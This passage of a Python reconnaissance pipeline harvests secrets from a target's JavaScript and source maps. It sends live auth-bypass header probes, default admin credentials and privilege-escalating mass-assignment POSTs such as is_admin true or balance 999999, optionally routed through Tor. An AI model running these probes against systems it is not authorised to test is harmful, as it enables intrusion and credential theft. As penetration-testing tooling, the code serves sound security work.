    js_urls = outdir / "urls_js.txt"
    if not js_urls.exists() or not read_lines(js_urls):
        log("warn", "15-SECRETS: no JS URLs; skipping")
        return {"15-SECRETS": str(outdir / "js_secrets_deep.txt"), "count": 0}
    findings: List[str] = []
    seen_secrets: Set[str] = set()
    seen_sourcemaps: Set[str] = set()
    for js_url in read_lines(js_urls):
        try:
            _k_hdr = {"User-Agent": "Mozilla/5.0"}
            _k_hdr.update(_k_extra_headers)
            req = urllib.request.Request(js_url, headers=_k_hdr)
            with _k_urlopen(req, timeout=15) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
        except Exception:
            continue
        # Save raw JS file for gitleaks scanning
        js_raw = ensure(outdir / f"js_raw_{safe_suffix(js_url)}.js")
        js_raw.write_text(body)
        # Custom regex patterns
        for name, pattern in _JS_SECRET_PATTERNS:
            for m in re.finditer(pattern, body):
                val = m.group()
                if val not in seen_secrets:
                    seen_secrets.add(val)
                    findings.append(f"[{name}] {val}  ({js_url})")
        # Shannon-entropy scan for high-entropy strings (likely API keys /
        # secrets not caught by regex). Look for base64-ish strings of 32+ chars.
        for m in re.finditer(r"[\"']([A-Za-z0-9+/=]{40,})[\"']", body):
            val = m.group(1)
            if val in seen_secrets:
                continue
            # Shannon entropy > 4.5 suggests random-looking secret
            freq = [0.0] * 128
            for c in val:
                if ord(c) < 128:
                    freq[ord(c)] += 1
            entropy = 0.0
            for f in freq:
                if f > 0:
                    p = f / len(val)
                    entropy -= p * math.log2(p) if p > 0 else 0.0
            if entropy > 4.5:
                seen_secrets.add(val)
                findings.append(f"[high-entropy] {val[:60]}… (entropy={entropy:.2f})  ({js_url})")
        # Source maps
        for m in _SOURCE_MAP_RE.finditer(body):
            sm_url = m.group(1)
            if not sm_url.startswith("http"):
                base = js_url.rsplit("/", 1)[0]
                sm_url = base.rstrip("/") + "/" + sm_url.lstrip("/")
            sm_entry = f"[sourcemap] {sm_url}  ({js_url})"
            if sm_url in seen_sourcemaps:
                continue
            seen_sourcemaps.add(sm_url)
            findings.append(sm_entry)
            try:
                _k_sm_hdr = {"User-Agent": "Mozilla/5.0"}
                _k_sm_hdr.update(_k_extra_headers)
                sm_req = urllib.request.Request(sm_url, headers=_k_sm_hdr)
                with _k_urlopen(sm_req, timeout=15) as sm_resp:
                    sm_body = sm_resp.read().decode("utf-8", errors="ignore")
                sm_data = json.loads(sm_body)
                sources = sm_data.get("sources") or []
                for src in sources:
                    if isinstance(src, str):
                        for name2, pattern2 in _JS_SECRET_PATTERNS:
                            for m2 in re.finditer(pattern2, src):
                                val2 = m2.group()
                                if val2 not in seen_secrets:
                                    seen_secrets.add(val2)
                                    findings.append(f"  [sourcemap-{name2}] {val2}")
            except Exception:
                continue
    # gitleaks scan on downloaded JS files for secret patterns
    if t.has("gitleaks"):
        if list(outdir.glob("js_raw_*.js")):
            gitleaks_jobs: List[Tuple[str, List[str], int]] = []
            for jf in sorted(outdir.glob("js_raw_*.js")):
                safe = safe_suffix(jf.name)
                gl_out = outdir / f"gitleaks_{safe}.json"
                gitleaks_jobs.append(
                    (
                        f"gitleaks-{safe[:16]}",
                        [
                            "gitleaks", "detect",
                            "--source", str(jf),
                            "--report-format", "json",
                            "--report-path", str(gl_out),
                            "--no-git",
                            "-v",
                        ],
                        300,
                    )
                )
            if gitleaks_jobs:
                await run_parallel(gitleaks_jobs, outdir)
                for glp in sorted(outdir.glob("gitleaks_*.json")):
                    try:
                        gl_data = json.loads(glp.read_text())
                        if isinstance(gl_data, list):
                            for item in gl_data:
                                desc = item.get("description", "secret")
                                file = item.get("file", "")
                                line = item.get("startLine", "")
                                match = item.get("match", "")[:80]
                                findings.append(
                                    f"  [gitleaks] {desc} in {file}:{line} {match}"
                                )
                        elif isinstance(gl_data, dict) and gl_data.get("Findings"):
                            for item in gl_data["Findings"]:
                                findings.append(
                                    f"  [gitleaks] {item.get('Description','secret')} "
                                    f"in {item.get('File','')}:{item.get('StartLine','')} "
                                    f"{item.get('Match','')[:80]}"
                                )
                    except (json.JSONDecodeError, ValueError):
                        continue
    out = ensure(outdir / "js_secrets_deep.txt")
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    # Clean up raw JS and intermediate gitleaks files
    for p in outdir.glob("js_raw_*.js"):
        p.unlink(missing_ok=True)
    for p in outdir.glob("gitleaks_*.json"):
        p.unlink(missing_ok=True)
    log("ok", f"15-SECRETS: {len(findings)} deep JS findings → {out}")
    return {"15-SECRETS": str(out), "count": len(findings)}


# ─────────────── Phase 16-AUTHZ: auth bypass + mass assignment ─────────────────────
_AUTH_BYPASS_HEADERS = [
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Scheme",
    "X-Real-IP",
    "Client-IP",
    "X-Custom-IP-Authorization",
    "X-Auth-Token",
    "X-Auth-User",
    "Authorization: Basic YWRtaW46YWRtaW4=",
]
_MASS_ASSIGN_FIELDS = [
    "admin",
    "is_admin",
    "role",
    "roles",
    "permissions",
    "is_teacher",
    "is_student",
    "group",
    "user_type",
    "balance",
    "points",
    "score",
    "grade",
    "completed",
    "approved",
    "verified",
    "active",
    "enabled",
    "plan",
    "tier",
    "subscription",
]


async def phase_16_AUTHZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"16-AUTHZ"}:
        return {}
    _l_out = outdir / "auth_bypass.txt"
    if _l_out.exists() and not force:
        return {"16-AUTHZ": str(_l_out), "count": count_nonblank(_l_out)}
    log("info", "Phase 16-AUTHZ: auth bypass headers + mass assignment probes")
    findings: List[str] = []
    _l_urlopen = _get_urlopener()
    # 1. Collect API-like endpoints from urls_all.txt + ffuf output
    urls = outdir / "urls_all.txt"
    api_endpoints: Set[str] = set()
    if urls.exists():
        for u in _dedupe_by_host_path(read_lines(urls)):
            path = u.split("?")[0].split("#")[0].lower()
            if "/api/" in path or path.endswith(
                (
                    "/api",
                    "/account",
                    "/login",
                    "/register",
                    "/password",
                    "/user",
                    "/admin",
                    "/graphql",
                )
            ):
                api_endpoints.add(u)
    # Also check ffuf output for 200/301/302/403 endpoints
    for ff in outdir.glob("ffuf_*.txt"):
        if ff.exists() and ff.name != "fuzz.txt":
            for ln in read_lines(ff):
                parts = ln.split("\t", 1)
                if len(parts) == 2:
                    api_endpoints.add(parts[1])
    if not api_endpoints:
        # Fall back to first 10 urls
        api_endpoints = set(read_lines(urls)[:_PIPELINE_CFG.sample_endpoints_l]) if urls.exists() else set()
    if not api_endpoints:
        log("warn", "16-AUTHZ: no endpoints found; skipping")
        return {"16-AUTHZ": str(outdir / "auth_bypass.txt"), "count": 0}
    findings.append(f"target_endpoints={len(api_endpoints)}")
    for ep in sorted(api_endpoints)[:_PIPELINE_CFG.sample_endpoints_l]:
        findings.append(f"  endpoint={ep}")
    # 2. Auth bypass header probes (non-destructive, concurrent)
    bypass_found: List[str] = []
    targets = sorted(api_endpoints)[:_PIPELINE_CFG.sample_endpoints_l]

    async def _check_bypass(ep: str) -> List[str]:
        results: List[str] = []
        try:
            base_req = urllib.request.Request(ep, method="GET")
            with _l_urlopen(base_req, timeout=8) as base_resp:
                baseline_status = base_resp.status
                baseline_body = base_resp.read()
                baseline_len = len(baseline_body)
        except Exception:
            return results
        for hdr in _AUTH_BYPASS_HEADERS:
            await _throttle()
            try:
                req = urllib.request.Request(ep, method="GET")
                if ":" in hdr:
                    k, v = hdr.split(":", 1)
                    req.add_header(k.strip(), v.strip())
                elif hdr in ("X-Original-URL", "X-Rewrite-URL"):
                    req.add_header(hdr, "/admin")
                elif hdr in ("X-Auth-Token", "X-Auth-User"):
                    req.add_header(hdr, "admin")
                elif hdr == "X-Custom-IP-Authorization":
                    req.add_header(hdr, "127.0.0.1")
                elif hdr == "Authorization: Basic YWRtaW46YWRtaW4=":
                    req.add_header("Authorization", "Basic YWRtaW46YWRtaW4=")
                else:
                    req.add_header(hdr, "127.0.0.1")
                with _l_urlopen(req, timeout=8) as resp:
                    probe_body = resp.read()
                    probe_len = len(probe_body)
                    # Different status code → potential bypass
                    if resp.status != baseline_status and resp.status in (200, 302, 403, 401):
                        results.append(
                            f"  bypass={hdr} → {resp.status} (baseline={baseline_status}) on {ep}"
                        )
                        break
                    # Same status code but significantly different body length → may indicate
                    # different content being served (e.g. admin panel vs login page)
                    if (resp.status == baseline_status
                            and probe_len
                            and abs(probe_len - baseline_len) > max(100, baseline_len * 0.1)):
                        results.append(
                            f"  bypass_body_diff={hdr} (status={resp.status}, len={probe_len}, baseline_len={baseline_len}) on {ep}"
                        )
            except Exception:
                continue
        return results

    bypass_results = await asyncio.gather(*[_check_bypass(ep) for ep in targets])
    for br in bypass_results:
        bypass_found.extend(br)

    # 3. POST body mass assignment probes (concurrent)
    post_findings: List[str] = []
    post_targets = [ep for ep in targets if "?" not in ep.split("#")[0]][:_PIPELINE_CFG.sample_endpoints_post]

    _MASS_ASSIGN_VALUES: Dict[str, object] = {
        "admin": True, "is_admin": True, "role": "admin", "roles": ["admin"],
        "permissions": ["admin"], "is_teacher": True, "is_student": True,
        "group": "admin", "user_type": "admin", "plan": "enterprise", "tier": "premium",
        "subscription": "premium", "balance": 999999, "points": 999999,
        "score": 999999, "grade": "A+", "completed": True, "approved": True,
        "verified": True, "active": True, "enabled": True,
    }

    async def _check_mass_assignment(ep: str) -> List[str]:
        results: List[str] = []
        for field in _MASS_ASSIGN_FIELDS[:_PIPELINE_CFG.sample_endpoints_post]:
            await _throttle()
            val = _MASS_ASSIGN_VALUES.get(field, True)
            body = json.dumps({field: val}).encode()
            try:
                req = urllib.request.Request(ep, data=body, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                with _l_urlopen(req, timeout=8) as resp:
                    if resp.status in (200, 201, 302):
                        results.append(f"  POST {ep} {{{field}: {json.dumps(val)}}} → {resp.status}")
            except Exception:
                continue
        return results

    post_results = await asyncio.gather(*[_check_mass_assignment(ep) for ep in post_targets])
    for pr in post_results:
        post_findings.extend(pr)

    findings.append("auth_bypass_probes:")
    findings.extend(bypass_found or ["  none detected (expected)"])
    if post_findings:
        findings.append("mass_assignment_probes:")
        findings.extend(post_findings)
    # 4. Basic CORS misconfiguration check (origin reflection)
    cors_findings: List[str] = []
    for ep in targets[:_PIPELINE_CFG.sample_endpoints_cors]:
        _throttle_sync()
        try:
            req = urllib.request.Request(ep, method="GET")
            req.add_header("Origin", "https://evil.example.com")
            with _l_urlopen(req, timeout=8) as resp:
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                if "*" in acao or "evil.example.com" in acao:
                    cors_findings.append(
                        f"  cors_origin_reflection=YES (ACAO={acao}, ACAC={acac}) on {ep}"
                    )
        except Exception:
            continue
    if cors_findings:
        findings.append("cors_checks:")
        findings.extend(cors_findings)
    findings.append("mass_assignment_fields_to_test:")
    for field in _MASS_ASSIGN_FIELDS:
        val = _MASS_ASSIGN_VALUES.get(field, True)
        findings.append(f'  try POST/PUT with body: {{"{field}": {json.dumps(val)}}}')
    out = ensure(outdir / "auth_bypass.txt")
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"16-AUTHZ: {len(findings)} auth bypass findings → {out}")
    return {"16-AUTHZ": str(out), "count": len(findings)}


# ───────────────────────────── report writers ──────────────────────────────
def _counts(outdir: Path) -> Dict[str, int]:
    keys = {
        "subdomains": outdir / "all_subs.txt",
        "resolved": outdir / "resolved.txt",
        "open_ports": outdir / "ports.txt",
        "services": outdir / "services.txt",
        "live_hosts": outdir / "hosts.txt",
        "tech": outdir / "tech.txt",
        "takeover": outdir / "takeover.txt",
        "urls": outdir / "urls_all.txt",
        "js_urls": outdir / "urls_js.txt",
        "js_secrets": outdir / "js_secrets.txt",
        "js_deep": outdir / "js_secrets_deep.txt",
        "params": outdir / "params.txt",
        "fuzz": outdir / "fuzz.txt",
        "nuclei": outdir / "nuclei_combined.txt",
        "tls_wp": outdir / "tls_wp.txt",
        "origin": outdir / "origin.txt",
        "auth_bypass": outdir / "auth_bypass.txt",
        "vulns": outdir / "vulns.txt",
        "oast": outdir / "oast" / "callbacks.txt",
    }
    # Use count_nonblank() instead of len(read_lines()) so `#`-prefixed
    # entries (e.g. a subfinder banner) aren't silently dropped from
    # the report. We still skip files that don't exist.
    return {k: count_nonblank(v) for k, v in keys.items() if v.exists()}


def write_summary(outdir: Path, domain: str, state: dict, counts: Dict[str, int]) -> Path:
    payload = {
        "domain": domain,
        "generated_at": datetime.now().isoformat(timespec="seconds"),
        "toolchain": f"reconchain v{__version__}",
        "missing_tools": sorted(set(state.get("missing_tools", []))),
        "tool_failures": dict(state.get("tool_failures", {})),
        "artifacts": {k: v for k, v in state.get("artifacts", {}).items()},
        "counts": counts,
    }
    out = ensure(outdir / "summary.json")
    out.write_text(json.dumps(payload, indent=2, default=str))
    return out


HTML_CSS = """
:root{--fg:#e6edf3;--bg:#0d1117;--mut:#8b949e;--acc:#58a6ff;--warn:#d29922;--ok:#3fb950;--err:#f85149;}
*{box-sizing:border-box}body{font-family:ui-monospace,Menlo,Consolas,monospace;
background:var(--bg);color:var(--fg);margin:0;padding:32px;line-height:1.5}
h1{font-size:1.6em;margin:0 0 4px;color:var(--acc)}
h2{font-size:1.2em;border-bottom:1px solid #30363d;padding-bottom:6px;margin-top:32px}
small{color:var(--mut)}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px;margin-top:12px}
.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px}
.card b{color:var(--acc);font-size:1.4em;display:block}.card span{color:var(--mut);font-size:.85em}
pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;overflow:auto;font-size:.85em;max-height:480px}
.miss{color:var(--warn)}footer{margin-top:48px;color:var(--mut);font-size:.8em}
"""


def html_escape(s: str) -> str:
    return (
        s.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#39;")
    )


def write_html(outdir: Path, domain: str, counts: Dict[str, int], missing: List[str]) -> Path:
    cards = "\n".join(
        f'<div class="card"><b>{n}</b><span>{html_escape(k)}</span></div>'
        for k, n in counts.items()
    )
    sections = []
    for key in (
        "all_subs.txt",
        "resolved.txt",
        "hosts.txt",
        "ports.txt",
        "takeover.txt",
        "urls_all.txt",
        "js_secrets.txt",
        "js_secrets_deep.txt",
        "params.txt",
        "fuzz.txt",
        "nuclei_combined.txt",
        "tls_wp.txt",
        "ssti.txt",
        "origin.txt",
        "auth_bypass.txt",
        "services.txt",
        "vulns.txt",
    ):
        p = outdir / key
        if p.exists():
            txt = p.read_text(errors="ignore")
            if len(txt) > 50_000:
                txt = txt[:50_000] + "\n[…truncated…]"
            sections.append(f"<h2>{html_escape(key)}</h2><pre>{html_escape(txt)}</pre>")
    # OAST callbacks section
    oast_file = outdir / "oast" / "callbacks.txt"
    if oast_file.exists() and count_nonblank(oast_file):
        txt = oast_file.read_text(errors="ignore")
        sections.append(f"<h2>oast/callbacks.txt</h2><pre>{html_escape(txt)}</pre>")
    miss_html = (
        "<p class='miss'>missing: " + ", ".join(html_escape(m) for m in missing) + "</p>"
        if missing
        else ""
    )
    html = f"""<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<title>recon report — {html_escape(domain)}</title>
<style>{HTML_CSS}</style></head><body>
<h1>Recon Report: {html_escape(domain)}</h1>
<small>generated {datetime.now().isoformat(timespec="seconds")} · reconchain v{__version__}</small>
{miss_html}
<h2>Summary</h2><div class="grid">{cards}</div>
{"".join(sections)}
<footer>chained recon · all artifacts in <code>{html_escape(str(outdir))}</code></footer>
</body></html>"""
    out = ensure(outdir / "report.html")
    out.write_text(html)
    return out


def write_full_summary(outdir: Path, domain: str, counts: Dict[str, int], missing: List[str]) -> Path:
    lines = [
        "=" * 60,
        f"  Recon Summary — {domain}",
        f"  generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        "=" * 60,
        "",
    ]
    if missing:
        lines += ["⚠ MISSING TOOLS (install via ./install.sh)", ""]
        for m in missing:
            lines.append(f"  • {m}")
        lines.append("")
    lines += ["RESULTS", "-------", ""]
    if counts:
        lines.append(f"{'Artifact':<30} {'Count':>8}")
        lines.append("-" * 40)
        for k, n in sorted(counts.items()):
            lines.append(f"{k:<30} {n:>8}")
    lines.append("")
    # Append first few lines of each non-empty artifact for quick reference
    lines += ["KEY FINDINGS", "------------", ""]
    for key in (
        "all_subs.txt", "resolved.txt", "hosts.txt", "ports.txt",
        "takeover.txt", "urls_all.txt", "urls_js.txt",
        "js_secrets.txt", "js_secrets_deep.txt", "params.txt",
        "fuzz.txt", "nuclei_combined.txt", "tls_wp.txt",
        "origin.txt", "auth_bypass.txt", "vulns.txt", "ssti.txt",
    ):
        p = outdir / key
        if not p.exists():
            continue
        entries = read_lines(p)
        if not entries:
            continue
        lines.append(f"── {key} ({len(entries)} entries)")
        for i, entry in enumerate(entries[:5]):
            lines.append(f"  {entry[:120]}")
        if len(entries) > 5:
            lines.append(f"  … and {len(entries) - 5} more")
        lines.append("")
    # OOB callbacks
    oast = outdir / "oast" / "callbacks.txt"
    if oast.exists() and count_nonblank(oast):
        lines.append(f"── OOB callbacks ({count_nonblank(oast)} entries)")
        for ln in read_lines(oast)[:5]:
            lines.append(f"  {ln[:120]}")
        lines.append("")
    lines.append("=" * 60)
    out = ensure(outdir / "summary.txt")
    out.write_text("\n".join(lines) + "\n")
    return out


def write_markdown(outdir: Path, domain: str, counts: Dict[str, int], missing: List[str]) -> Path:
    lines = [
        f"# Recon Report — {domain}",
        f"_generated {datetime.now().isoformat(timespec='seconds')}_",
        "",
    ]
    if missing:
        lines += ["## ⚠ Missing tools", ", ".join(f"`{m}`" for m in missing), ""]
    lines += ["## Summary", "", "| Artifact | Count |", "|---|---:|"]
    for k, n in counts.items():
        lines.append(f"| `{k}` | {n} |")
    lines += ["", "## Artifacts", ""]
    for f in sorted(outdir.glob("*.txt")):
        lines.append(f"- `{f.name}`")
    oast = outdir / "oast" / "callbacks.txt"
    if oast.exists():
        lines += ["", "## OOB callbacks", ""]
        for ln in read_lines(oast)[:50]:
            lines.append(f"- `{ln}`")
    out = ensure(outdir / "report.md")
    out.write_text("\n".join(lines) + "\n")
    return out


# ───────────────────────────── pipeline runner ─────────────────────────────
PIPELINE = [
    ("01-RECON", phase_01_RECON, ("domain", "outdir", "t", "only", "skip", "resume", "force")),
    ("02-RESOLVE", phase_02_RESOLVE, ("domain", "outdir", "t", "only", "skip", "prev", "resume", "force")),
    ("03-PERMUTE", phase_03_PERMUTE, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("04-SCAN", phase_04_SCAN, ("outdir", "t", "only", "skip", "prev", "force")),
    ("05-HARVEST", phase_05_HARVEST, ("outdir", "t", "only", "skip", "prev", "force")),
    ("06-JSINTEL", phase_06_JSINTEL, ("outdir", "t", "only", "skip", "force")),
    ("07-PARAMS", phase_07_PARAMS, ("outdir", "t", "only", "skip", "prev", "force")),
    ("08-FUZZ", phase_08_FUZZ, ("outdir", "t", "only", "skip", "force")),
    ("09-VULNSCAN", phase_09_VULNSCAN, ("outdir", "t", "only", "skip", "force")),
    ("10-TLSCMS", phase_10_TLSCMS, ("outdir", "t", "only", "skip", "force")),
    ("11-INJECT", phase_11_INJECT, ("outdir", "t", "only", "skip", "oast_domain", "force")),
    ("12-SSTI", phase_12_SSTI, ("outdir", "t", "only", "skip", "prev", "force")),
    ("13-OOB", phase_13_OOB, ("outdir", "t", "only", "skip", "oast", "force")),
    ("14-ORIGIN", phase_14_ORIGIN, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("15-SECRETS", phase_15_SECRETS, ("outdir", "t", "only", "skip", "force")),
    ("16-AUTHZ", phase_16_AUTHZ, ("outdir", "t", "only", "skip", "force")),
]
# Dependency-ordered execution stages. Phases in the same stage are independent
# of one another (they only read artifacts produced by *earlier* stages, never
# each other's output), so they run concurrently.
# Stage 0 — Discovery: subdomains, DNS, ports, URLs (linear spine, streaming)
# Stage 1 — Analysis: JS, params, fuzzing, vuln scans, origin, secrets, authz
# Stage 2 — Injection: XSS/SQLi/SSTI (needs params from stage 1)
# Stage 3 — OOB: collect OOB callbacks after injections
# Dependency-ordered execution stages. Phases in the same stage are independent
# of one another (they only read artifacts produced by *earlier* stages, never
# each other's output), so they run concurrently.
# Stage 0 — Discovery: subdomains, DNS, ports, URLs (linear spine, streaming)
# Stage 1 — Analysis: JS, params, fuzzing, vuln scans, origin, secrets, TLS
# Stage 2 — Post-fuzz: injection (needs params), authz (reads ffuf output from
#           Stage 1 so it must come after 08-FUZZ, not concurrent with it)
# Stage 3 — OOB: collect OOB callbacks after injections
STAGES: List[List[str]] = [
    ["01-RECON", "02-RESOLVE", "03-PERMUTE", "04-SCAN", "05-HARVEST"],
    ["06-JSINTEL", "07-PARAMS", "08-FUZZ", "09-VULNSCAN", "10-TLSCMS", "14-ORIGIN", "15-SECRETS"],
    ["11-INJECT", "12-SSTI", "16-AUTHZ"],
    ["13-OOB"],
]


def _atomic_write_json(path: Path, payload: dict) -> None:
    """Write JSON atomically: temp file + rename, so a mid-write crash
    can't leave a half-written state.json that breaks --resume."""
    ensure(path)
    tmp = path.with_suffix(path.suffix + ".tmp")
    with tmp.open("w") as f:
        json.dump(payload, f, indent=2, default=str)
    os.replace(tmp, path)


def _parse_phase_csv(value: str) -> PhaseSet:
    phases = {p.strip().upper() for p in value.split(",") if p.strip()}
    invalid = sorted(phases - VALID_PHASES)
    if invalid:
        raise argparse.ArgumentTypeError(
            f"unknown phase(s): {', '.join(invalid)}; valid phases: "
            f"{', '.join(sorted(VALID_PHASES))}"
        )
    return phases


def _domain_arg(value: str) -> str:
    domain = value.rstrip(".").lower()
    if not _is_valid_hostname(domain):
        raise argparse.ArgumentTypeError(
            "domain must be a valid DNS name with at least one dot, for example example.com"
        )
    return domain


def _csv_from_phases(value: object) -> PhaseSet:
    if isinstance(value, set):
        return {str(v).upper() for v in value}
    if isinstance(value, str):
        return _parse_phase_csv(value)
    return set()


async def run_pipeline(args: argparse.Namespace) -> int:
    outdir = Path(args.out).resolve()
    if outdir.exists() and not outdir.is_dir():
        raise ValueError(f"output path exists and is not a directory: {outdir}")
    outdir.mkdir(parents=True, exist_ok=True)
    state_path = outdir / "state.json"
    state: Dict[str, Any] = {
        "domain": args.domain,
        "artifacts": {},
        "missing_tools": [],
        "tool_failures": {},
    }
    if args.resume and state_path.exists():
        try:
            with state_path.open() as f:
                saved = json.load(f)
            # --resume only makes sense for the same target domain. If the
            # state file is for a different domain, start fresh so we never
            # accidentally reuse the wrong target's artifacts.
            if saved.get("domain") and saved.get("domain") != args.domain:
                log(
                    "warn",
                    f"state.json is for domain {saved.get('domain')!r}, "
                    f"not {args.domain!r}; ignoring and starting fresh",
                )
            else:
                # Resolve stored artifact paths against THIS outdir. The
                # state file may have been written from a previous run
                # whose absolute paths no longer apply (BUG-6); relative
                # paths from the stored outdir are rebased onto outdir.
                prev_outdir_s = saved.get("outdir")
                prev_outdir = Path(prev_outdir_s) if prev_outdir_s else None
                rebased: Dict[str, Any] = {}
                for k, v in (saved.get("artifacts") or {}).items():
                    if not isinstance(v, str):
                        continue
                    p = Path(v)
                    if p.is_absolute() and prev_outdir is not None:
                        try:
                            p = p.relative_to(prev_outdir)
                        except ValueError:
                            pass  # path wasn't under the old outdir; keep as-is
                        rebased[k] = str(outdir / p)
                    elif p.is_absolute():
                        rebased[k] = v
                    else:
                        rebased[k] = str(outdir / p)
                saved["artifacts"] = rebased
                state = saved
                log("info", f"resuming from {state_path}")
        except json.JSONDecodeError:
            log("warn", f"{state_path} corrupt; ignoring and starting fresh")
    # Always record the outdir we actually used so future resumes can
    # rebase stored artifact paths (see BUG-6).
    state["outdir"] = str(outdir)
    t = Tools()
    only = _csv_from_phases(args.only)
    skip = _csv_from_phases(args.skip)
    if args.fast and not only:
        only = FAST_PHASES
        log("info", f"fast mode — phases: {', '.join(sorted(only))}")
    elif args.fast and only:
        log("info", "--fast is implied by --only; running selected phases only")
    if only and skip:
        overlap = sorted(only & skip)
        if overlap:
            raise ValueError(f"phase(s) cannot be both --only and --skip: {', '.join(overlap)}")
    # pre-seed missing tools from state so a partial resume doesn't lose them,
    # but re-check each one so newly installed tools are recognized.
    for m in list(state.get("missing_tools", [])):
        if shutil.which(m):
            state["missing_tools"].remove(m)
        else:
            t.seed_missing([m])
    # Bind the process-wide job semaphore to THIS event loop so every phase's
    # run_parallel() shares one budget of live external processes.
    global _JOB_SEM, _PIPELINE_CFG, _USE_PROXYCHAINS

    # Auto-detect proxychains4 for tor routing
    if shutil.which("proxychains4"):
        _USE_PROXYCHAINS = True
        log("info", "proxychains4 detected — wrapping all commands")

    proxy = getattr(args, 'proxy', '')
    if not proxy:
        proxy = _auto_detect_proxy()
        if proxy:
            log("info", f"proxy auto-detected: {proxy}")

    cookie = getattr(args, 'cookie', '')
    if not cookie:
        cookie = _auto_detect_cookies()
        if cookie:
            log("info", "cookie auto-detected")

    _PIPELINE_CFG = PipelineConfig(
        sqlmap_level=getattr(args, 'sqlmap_level', 1),
        sqlmap_risk=getattr(args, 'sqlmap_risk', 1),
        delay=getattr(args, 'delay', 0.0),
        rate_limit=getattr(args, 'rate_limit', 0),
        sample_urls_fuzz=getattr(args, 'sample_urls_fuzz', 5),
        sample_urls_params=getattr(args, 'sample_urls_params', 50),
        sample_hosts_ssl=getattr(args, 'sample_hosts_ssl', 10),
        sample_hosts_origin=getattr(args, 'sample_hosts_origin', 10),
        sample_endpoints_l=getattr(args, 'sample_endpoints_l', 20),
        sample_urls_xss_blind=getattr(args, 'sample_urls_xss_blind', 20),
        sample_urls_ssti=getattr(args, 'sample_urls_ssti', 5),
        sample_endpoints_post=getattr(args, 'sample_endpoints_post', 5),
        sample_endpoints_cors=getattr(args, 'sample_endpoints_cors', 10),
        nuclei_exclude_tags=getattr(args, 'exclude_tags', ''),
        proxy=proxy,
    )
    jobs = max(1, args.jobs)
    if jobs != MAX_PARALLEL_JOBS:
        log("info", f"parallel jobs set to {jobs}")
    _JOB_SEM = asyncio.Semaphore(jobs)
    oast = Interactsh(outdir)
    oast_started = False
    phase_map = {name: fn for name, fn, _ in PIPELINE}

    def _selected(name: str) -> bool:
        return (not only or name in only) and name not in skip

    phases_to_run = [name for name, _, _ in PIPELINE if _selected(name)]
    progress = Progress(len(phases_to_run), stages=STAGES)
    active_needs_oast = any(name in {"08-FUZZ", "09-VULNSCAN", "10-TLSCMS", "11-INJECT"} for name in phases_to_run)
    h_selected = _selected("13-OOB")
    if active_needs_oast and h_selected:
        oast_started = oast.start()

    def _apply(name: str, result: Dict[str, Any]) -> None:
        """Fold a finished phase's result into prev/state. Runs in the single
        event-loop thread (synchronous, no await), so it is race-free even when
        phases in a stage complete concurrently."""
        prev.update(result or {})
        state["artifacts"].update({k: v for k, v in (result or {}).items() if isinstance(v, str)})
        # accumulate (not overwrite) missing tools across phases
        for m in t.missing:
            if m not in state["missing_tools"]:
                state["missing_tools"].append(m)
        # surface partial tool failures (BUG-5): non-zero exits / timeouts the
        # run survived but whose artifact is partial. Shown in summary.json.
        new_failures = (result or {}).get("failures") or {}
        if isinstance(new_failures, dict):
            state.setdefault("tool_failures", {}).update(
                {k: int(v) for k, v in new_failures.items()}
            )

    if proxy:
        os.environ["PROXY"] = proxy
        log("info", f"proxy set to {proxy}")

    if cookie:
        os.environ["COOKIE"] = cookie
        log("info", "cookie set")
    extra_hdrs = list(getattr(args, 'extra_headers', []))
    if extra_hdrs:
        os.environ["EXTRA_HEADERS"] = "\n".join(extra_hdrs)
        log("info", f"{len(extra_hdrs)} extra header(s) set")

    phase_timing: Dict[str, Dict[str, str]] = {}

    async def _run_phase(name: str) -> Dict[str, Any]:
        fn = phase_map[name]
        kwargs = {
            "domain": args.domain,
            "outdir": outdir,
            "t": t,
            "only": only,
            "skip": skip,
            "prev": prev,
            "oast_domain": oast.domain,
            "oast": oast,
            "resume": bool(args.resume),
            "force": bool(getattr(args, 'force', False)),
        }
        sig = inspect.signature(fn)
        call = {k: v for k, v in kwargs.items() if k in sig.parameters}
        t0 = datetime.now()
        try:
            result = await fn(**call)
        except Exception as e:
            log("err", f"phase {name} crashed: {e}")
            result = {}
        t1 = datetime.now()
        elapsed = (t1 - t0).total_seconds()
        phase_timing[name] = {
            "start": t0.isoformat(timespec="seconds"),
            "end": t1.isoformat(timespec="seconds"),
            "elapsed_seconds": round(elapsed, 1),
        }
        progress.next(name)
        return result or {}

    # Register signal handlers so child processes are cleaned up when
    # the script is killed externally (e.g. timeout command, Ctrl+C).
    _orig_sigint = signal.signal(signal.SIGINT, lambda s, f: (_cleanup_child_procs(), sys.exit(130)))
    _orig_sigterm = signal.signal(signal.SIGTERM, lambda s, f: (_cleanup_child_procs(), sys.exit(143)))

    try:
        prev: Dict[str, Any] = dict(state.get("artifacts", {}))
        for stage in STAGES:
            run_now = [name for name in stage if _selected(name)]
            for name in stage:
                if not _selected(name) and name in skip:
                    log("skip", f"phase {name} (--skip)")
            if not run_now:
                continue
            # Independent phases in a stage run concurrently; they only read
            # artifacts from earlier stages, so a shared `prev` snapshot is safe.
            results = await asyncio.gather(*(_run_phase(n) for n in run_now))
            for name, result in zip(run_now, results):
                _apply(name, result)
                # Downsample artifacts to 1 entry per file when --sample is used,
                # otherwise keep all results so real scans produce complete output.
                if getattr(args, 'sample', False):
                    for k, v in (result or {}).items():
                        if isinstance(v, str) and v.endswith(".txt"):
                            _downsample_file(Path(v), n=1)
            try:
                _atomic_write_json(state_path, state)
            except Exception as e:
